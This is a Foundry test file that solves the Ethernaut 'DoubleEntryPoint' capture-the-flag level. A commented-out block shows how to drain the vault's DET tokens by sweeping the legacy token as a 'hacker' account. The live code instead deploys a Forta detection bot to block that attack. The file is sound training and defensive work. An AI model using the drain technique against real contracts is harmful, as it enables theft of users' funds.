// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "src/core/Ethernaut.sol";
import "src/levels/26-DoubleEntryPoint/DoubleEntryPointFactory.sol";
import "src/levels/26-DoubleEntryPoint/DetectionBot.sol";

contract DoubleEntryPointTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address hacker = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function testDoubleEntryPointHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        DoubleEntryPointFactory doubleEntryPointFactory = new DoubleEntryPointFactory();
        ethernaut.registerLevel(doubleEntryPointFactory);
        vm.startPrank(hacker);
        address levelAddress = ethernaut.createLevelInstance(doubleEntryPointFactory);
        DoubleEntryPoint ethernautDoubleEntryPoint = DoubleEntryPoint(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // // How to drain the underlying token of the vault
        // address legacyTokenAddress = ethernautDoubleEntryPoint.delegatedFrom();
        // address cryptoVaultAddress = ethernautDoubleEntryPoint.cryptoVault();
        // LegacyToken legacyToken = LegacyToken(legacyTokenAddress);
        // CryptoVault cryptoVault = CryptoVault(cryptoVaultAddress);

        // emit log("--------------------before exploit--------------------");
        // emit log_named_uint("the DET token in CryptoVault", ethernautDoubleEntryPoint.balanceOf(cryptoVaultAddress));
        // emit log_named_uint("hacker's DET balance", ethernautDoubleEntryPoint.balanceOf(hacker));
        // cryptoVault.sweepToken(legacyToken);
        // emit log("--------------------after exploit--------------------");
        // emit log_named_uint("the DET token in CryptoVault", ethernautDoubleEntryPoint.balanceOf(cryptoVaultAddress));
        // emit log_named_uint("hacker's DET balance", ethernautDoubleEntryPoint.balanceOf(hacker));

        // use forta to prevent attacks
        address cryptoVaultAddress = ethernautDoubleEntryPoint.cryptoVault();
        DetectionBot db = new DetectionBot(cryptoVaultAddress);
        Forta forta = ethernautDoubleEntryPoint.forta();
        forta.setDetectionBot(address(db));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
